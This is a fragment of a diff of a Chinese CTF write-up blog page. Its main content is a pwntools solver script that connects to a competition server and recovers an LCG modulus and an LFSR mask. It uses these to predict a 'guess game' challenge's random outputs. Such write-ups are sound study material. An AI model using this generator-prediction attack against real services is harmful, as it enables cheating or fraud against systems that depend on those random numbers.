class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, n, key, r, b)</span>:</span></span><br><span class="line">        self.n = n</span><br><span class="line">        self.key = key</span><br><span class="line">        self.r = r &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        self.b = b</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">out</span><span class="params">(self)</span>:</span></span><br><span class="line">        o = self.r &amp; <span class="number">1</span></span><br><span class="line">        p = self.r &amp; self.key</span><br><span class="line">        q = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> p:</span><br><span class="line">            q = q + p &amp; <span class="number">1</span></span><br><span class="line">            p = p &gt;&gt; <span class="number">1</span></span><br><span class="line">        q = q &amp; <span class="number">1</span></span><br><span class="line">        t = q &lt;&lt; (self.n - <span class="number">2</span>) &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        self.r = t | (self.r &gt;&gt; <span class="number">1</span>) &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> o</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.b):</span><br><span class="line">            o = self.out()</span><br><span class="line">            res |= o &lt;&lt; (self.b - <span class="number">1</span> - i)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y = egcd(b, a % b)</span><br><span class="line">        <span class="keyword">return</span> y, x - a / b * y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mask</span><span class="params">(stream)</span>:</span></span><br><span class="line">    dim = <span class="number">39</span></span><br><span class="line">    left, right = stream[:<span class="number">39</span>], stream[<span class="number">39</span>:]</span><br><span class="line">    magic = [map(int, list(right[:i][::<span class="number">-1</span>] + left[:(<span class="number">39</span> - i)])) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">39</span>)]</span><br><span class="line">    cipher = map(int, list(right))</span><br><span class="line">    <span class="keyword">print</span> len(cipher)</span><br><span class="line">    <span class="keyword">assert</span> len(cipher) == <span class="number">39</span></span><br><span class="line">    <span class="comment"># 高斯消元</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(dim):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(j, dim):</span><br><span class="line">            <span class="keyword">if</span> magic[i][j] == <span class="number">1</span>:</span><br><span class="line">                magic[i], magic[j] = magic[j], magic[i]</span><br><span class="line">                cipher[i], cipher[j] = cipher[j], cipher[i]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(dim):</span><br><span class="line">            <span class="keyword">if</span> magic[i][j] == <span class="number">1</span> <span class="keyword">and</span> i != j:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(dim):</span><br><span class="line">                    magic[i][k] ^= magic[j][k]</span><br><span class="line">                cipher[i] ^= cipher[j]</span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">''</span>.join(map(str, cipher)), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = remote(<span class="string">'59.110.243.101'</span>, <span class="number">5123</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'2'</span>)</span><br><span class="line">    n = []</span><br><span class="line">    r.recvuntil(<span class="string">"Baby:"</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">    n.append(int(tmp))</span><br><span class="line">    r.recvuntil(<span class="string">"Easy:"</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">    n.append(int(tmp))</span><br><span class="line">    r.recvuntil(<span class="string">"Normal:"</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">    n.append(int(tmp))</span><br><span class="line">    r.recvuntil(<span class="string">"Hard:"</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">    n.append(int(tmp))</span><br><span class="line">    r.recvuntil(<span class="string">"Master:"</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">    n.append(int(tmp))</span><br><span class="line">    r.recvuntil(<span class="string">"Crazy:"</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">    n.append(int(tmp))</span><br><span class="line">    n1, n2, n3, n4, n5, n6 = n</span><br><span class="line">    a = n2 - n1</span><br><span class="line">    b = n3 - n2</span><br><span class="line">    c = n4 - n3</span><br><span class="line">    <span class="keyword">if</span> gmpy2.gcd(a, b) != <span class="number">1</span>:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    x, y = egcd(a, b)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span> x * a + y * b == <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    d = b * x + c * y</span><br><span class="line">    m_bei = abs(d * (n5 - n4) - (n6 - n5))</span><br><span class="line">    data = os.popen(<span class="string">'sage test.sage %s'</span> % str(m_bei)).read()  <span class="comment"># 分解</span></span><br><span class="line">    data = data.split(<span class="string">" * "</span>)</span><br><span class="line">    m = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> int(i).bit_length() == <span class="number">64</span>:</span><br><span class="line">                m = int(i)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    info(m)</span><br><span class="line">    aa = (gmpy2.invert(a, m) * b) % m</span><br><span class="line">    cc = (n2 - n1 * aa) % m</span><br><span class="line">    res = (aa * n6 + cc) % m</span><br><span class="line">    success(res)</span><br><span class="line">    r.sendline(str(res))</span><br><span class="line">    r.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    answer = []</span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        r.sendlineafter(<span class="string">"Input your answer:"</span>, <span class="string">"1"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Right"</span> <span class="keyword">in</span> r.recvuntil(<span class="string">"!"</span>):</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">        r.recvuntil(<span class="string">"The answer is"</span>)</span><br><span class="line">        answer.append(int(r.recvuntil(<span class="string">"!"</span>).strip(<span class="string">"!"</span>)))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">        info(<span class="string">'times:'</span> + str(time))</span><br><span class="line">        time += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    info(<span class="string">'success!'</span>)</span><br><span class="line">    init = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> answer[:<span class="number">5</span>]:</span><br><span class="line">        init += bin(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">    init = init[::<span class="number">-1</span>]</span><br><span class="line">    first = init[<span class="number">0</span>]</span><br><span class="line">    init = init[<span class="number">1</span>:]</span><br><span class="line">    rr = int(init, <span class="number">2</span>)</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> answer[<span class="number">5</span>:]:</span><br><span class="line">        res += bin(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">    res = (first + res)[:<span class="number">-2</span>]</span><br><span class="line">    key = get_mask(init + res)</span><br><span class="line">    game = Game(<span class="number">40</span>, key, rr, <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">assert</span> [game.next() <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)] == answer</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">"Input your answer:"</span>, str(game.next()))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>跑了很多次，结果：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9223743-c2056d3de83b64d7.png" alt="image.png"></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i><i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/13/2018-HCTF/" class="archive-article-date">
-  	<time datetime="2018-11-13T07:13:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/13/2018-HCTF/">2018 HCTF 总结</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -204,365 +310,7 @@
 		</ul>
 	</div>
 
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF/Web//" class="article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/05/2018-XCTF-FINALS/" class="archive-article-date">
-  	<time datetime="2018-11-05T11:25:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/05/2018-XCTF-FINALS/">2018 XCTF FINALS</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF/Web//" class="article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/05/%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" class="archive-article-date">
-  	<time datetime="2018-11-05T02:32:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/05/%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/">2018 上海市大学生网络安全大赛题解</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Crypto</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF/wp//" class="article-tag-list-link color3">wp</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/10/22/2018-HITCON-On-my-Raddit/" class="archive-article-date">
-  	<time datetime="2018-10-22T07:00:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-22</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/10/22/2018-HITCON-On-my-Raddit/">2018 HITCON On my Raddit</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Crypto</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF/Web//" class="article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/10/15/2018-%E6%8A%A4%E7%BD%91%E6%9D%AF/" class="archive-article-date">
-  	<time datetime="2018-10-15T11:20:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/10/15/2018-%E6%8A%A4%E7%BD%91%E6%9D%AF/">2018 护网杯 wp</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Crypto</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/10/05/2018CSAW/" class="archive-article-date">
-  	<time datetime="2018-10-05T05:54:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/10/05/2018CSAW/">2018 CSAW</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Crypto</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Misc</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/10/03/PHPsession/" class="archive-article-date">
-  	<time datetime="2018-10-03T06:32:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-03</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/10/03/PHPsession/">PHP session 反序列化</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PHP</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -576,30 +324,180 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="/categories/CTF/Web/PHP//" class="article-tag-list-link color4">PHP</a>
+        			<a href="/categories/CTF/Web/Crypto//" class="article-tag-list-link color2">Crypto</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvElEQVR42u3aQW7jMBAEQP//0wmwpwB2pO4haQeL0imwtZTKB3K2Zx6P+Pr6d/38+/mT5P7rz69Xfn7KtgsPDw9v9OrJY54/v37wDJZTr+/Hw8PDO81rD4P8SMjvb9/n+h48PDy8v8BLtvt260+KeDw8PLz/g5cHE/kxsxJ/4OHh4b2flwcBv/3b/NtdwcTmrAUPDw9vUscWDbDP/n28v4eHh4c36qqfa3qtRMbF2+Lh4eEd4OWx7HWh3K7QxrX5OtH/GPDw8PCWeeub+8rA1nopXxffeHh4eFt57Va+MnbQPiX5uW/Wx8PDw1vmzcaqZiMFSRm9ciC9WB8PDw/vjby8yM5jhTxE2PZWeHh4eAd4s213JbxY3+7rb/Hw8PC28tol2pb/egyx0qLDw8PDO8fb9VrtwEE7OlC/LR4eHt4B3rBLttC8TwroOq69vhMPDw/vGG/2sLaVlTfb8h/u5p3x8PDwtvLyQjlv8M/K5RPFNx4eHt4JXhsizAYI2kGB6xI//4Hw8PDwTvNWAoLkwGjL6yQWaX96PDw8vL28dtudHRJJ1DsbILhZGQ8PD28Tb30jno1hzcYU6rEtPDw8vAO8ZMtuS+c8CG6D3TZoxsPDwzvHaxv2OTJvcSURRtuuw8PDwzvNa5tMs9BhZeU8Jn5xMODh4eFt4q1Hty1jFuPmJDw8PLxP8dphrFmbqs5L4m/rCQg8PDy8rpv/yLfmNmJoo9tZ6DCMffHw8PBGvK/ymjW03jN0dXPu4eHh4W3izTbfvJxth67aCLgdCMPDw8Pbxcsj2vUhgzyizVeLhq7w8PDwDvDaw6Dd0NvjJC+Rb+7Bw8PD+ygvr8TXg4NZ8f1iTTw8PLw/wJtt8S3p+olF6Y+Hh4d3jHcijMhT5HoUNS+y8fDw8A7w2gbYStjatsTaAa/hhYeHh5fyvgGd3OQp0PkZOAAAAABJRU5ErkJggg==" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2020/06/25/2020-5space/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          2020 第五空间智能安全大赛初赛wp
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2020/05/13/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">2020网鼎杯-青龙组wp</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpweb"><span class="toc-number">1.2.</span> <span class="toc-text">phpweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#think-java"><span class="toc-number">1.3.</span> <span class="toc-text">think java</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Simple"><span class="toc-number">2.1.</span> <span class="toc-text">Simple</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RUA"><span class="toc-number">2.2.</span> <span class="toc-text">RUA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#guess-game"><span class="toc-number">2.3.</span> <span class="toc-text">guess_game</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/tags/Web/">&amp;laquo; Prev</a><a class="page-number" href="/tags/Web/">1</a><span class="page-number current">2</span>
-    </nav>
   
 
+  
 
+  
+
+<!--显示阅读次数-->
+
+  <br/>
+  <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+  <span class="icon-sort"></span>
+  <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+            阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+  </span>
+  </a>
+
+<!--显示阅读次数完毕-->
+
